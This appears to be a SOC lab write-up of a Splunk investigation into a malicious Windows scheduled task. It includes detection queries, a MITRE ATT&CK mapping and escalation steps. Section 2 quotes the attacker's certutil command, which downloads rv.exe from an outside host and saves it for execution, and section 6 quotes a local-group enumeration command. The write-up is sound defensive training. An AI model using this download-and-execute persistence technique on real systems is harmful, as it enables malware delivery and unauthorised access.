Executive Summary
During routine monitoring, a SIEM alert identified the creation of a suspicious scheduled task on a Windows workstation.
The task was configured to download and execute a malicious payload using certutil and PowerShell, indicating persistence activity.
Investigation confirmed:
•	Scheduled task creation (Event ID 4698)
•	Malicious payload download via certutil
•	Execution via PowerShell
•	Activity performed by compromised account oliver.thompson
The activity was classified as True Positive and escalated to SOC Level 2.
Environment
SIEM: Splunk
Log Source: Windows Security Logs
Index: win-alert
Target Host: WIN-H015
User: oliver.thompson

1. Initial Alert Analysis
The investigation begins by validating the alert indicating the creation of a scheduled task.
Splunk Query
index="win-alert" EventCode=4698 Task_Name="AssessmentTaskOne"
| table _time EventCode user_name host Task_Name Message
Findings
The search results confirm that a scheduled task named AssessmentTaskOne was created on host WIN-H015 by user oliver.thompson.
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/e03c54eb-b792-4dba-ba36-82bf3373e28f" />

2. Scheduled Task Configuration Analysis
The next step is to examine the configuration of the scheduled task to determine what actions it performs.
Splunk Query
index="win-alert" EventCode=4698 Task_Name="AssessmentTaskOne"
| table _time host user_name Task_Name Message
Findings
The Message field contains the XML configuration of the task.
Analysis reveals that the task performs the following actions:
1.	Uses certutil.exe to download a file named rv.exe
2.	Saves the file into the Temp directory
3.	Renames it as DataCollector.exe
4.	Executes the payload using PowerShell Start-Process
The command observed in the task configuration:
certutil.exe -urlcache -split -f http://tryhotme/rv.exe C:\Temp\DataCollector.exe
This behavior is commonly associated with malware delivery and persistence mechanisms.
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/1235c3d3-670d-4304-a159-72e437cb4960" />

3. Scheduled Task Frequency Analysis
It is important to determine whether the scheduled task executes repeatedly, which may indicate persistence.
Splunk Query
index="win-alert" Task_Name="AssessmentTaskOne"
| stats count by host Task_Name
Findings
The task is configured to run daily, which is unusual for a standard user workstation.
This configuration strongly suggests the task was created to maintain persistent access.

4. Process Identification
Next, the investigation focuses on identifying the process responsible for creating the scheduled task.
Splunk Query
index="win-alert" EventCode=4698 Task_Name="AssessmentTaskOne"
| table _time host user_name ProcessId Task_Name
Findings
The results reveal the ProcessId responsible for creating the scheduled task.
Identifying the originating process helps determine how the task was created.
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/4acafa66-e743-4111-84cf-920af0ff3697" />

5. Parent Process Investigation
After identifying the process responsible for creating the task, the next step is to determine its parent process.
Splunk Query
index="win-alert" ProcessId=<PROCESS_ID>
| table _time host ProcessId ParentProcessName Message
Findings
The parent process helps identify the execution context.
In many cases, malicious scheduled tasks are created through:
•	powershell.exe
•	cmd.exe
•	schtasks.exe
This helps determine whether the activity was interactive or automated.
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/7912c2f4-47bd-42af-9878-6d1985abfca9" />

6. Discovery Activity Investigation
Threat actors often perform reconnaissance activities after gaining access to a system.
In this case, logs indicate that the attacker enumerated local groups.
Splunk Query
index="win-alert" host="WIN-H015"
| search "localgroup"
| table _time host user_name Message
Findings
The logs reveal commands used to enumerate local groups, such as:
net localgroup administrators
This activity is associated with the Discovery phase of an attack.
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/8c247b5e-844f-46ec-aafe-1d2adeb32224" />

7. Logon Source Investigation
The final step is to determine from which workstation the attacker logged into the compromised host.
Splunk Query
index="win-alert" EventCode=4624 host="WIN-H015"
| table _time user_name Workstation_Name Logon_Type
Findings
Event ID 4624 indicates a successful logon.
The Workstation_Name field reveals the system from which the attacker authenticated.
This information is important for identifying possible lateral movement.
Screenshot Required: YES
The screenshot should clearly show:
•	Workstation_Name
•	Logon_Type
•	user_name
<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/89f7b10a-71e5-487a-9343-246f804b57d7" />

MITRE ATT&CK Mapping
Technique	Description
T1053	Scheduled Task / Persistence
T1105	Ingress Tool Transfer
T1059	Command Execution
T1087	Account Discovery

Incident Classification
Severity: High
Classification: True Positive
Impact: Persistence established on Windows workstation
The scheduled task downloads and executes a payload, indicating malicious persistence activity.

Escalation Decision
The incident was escalated to SOC Level 2 for further investigation and response.
Recommended response actions:
•	Isolate host WIN-H015
•	Reset credentials for oliver.thompson
•	Investigate lateral movement
•	Perform malware analysis on the downloaded payload
•	Conduct environment-wide threat hunting







Event ID 4698 indicates the creation of a new scheduled task in Windows.
This confirms that the alert is valid and requires further investigation.
